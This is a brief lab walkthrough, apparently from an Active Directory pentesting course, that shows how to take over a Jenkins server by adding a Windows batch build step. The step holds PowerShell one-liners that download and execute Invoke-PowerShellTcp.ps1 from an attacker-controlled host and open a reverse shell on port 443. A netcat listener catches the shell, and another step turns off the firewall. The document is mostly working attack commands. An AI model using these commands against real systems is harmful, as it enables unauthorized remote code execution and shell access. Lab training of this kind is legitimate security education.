1. Access http://172.16.3.11:8080 (jenkins)
2. Choose any project>configure>add windows batch command 

```
powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.X -Port 443

or

powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```
3. make sure the payload is hosted on HFS web server and turn of the firewall on the student machine.
4. use a listener then to capture the tcp connection with this command 
```
	C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
```
5. launch the Build by clicking on 'Build Now' and on the listener, you will see a connection to dcorp-ci
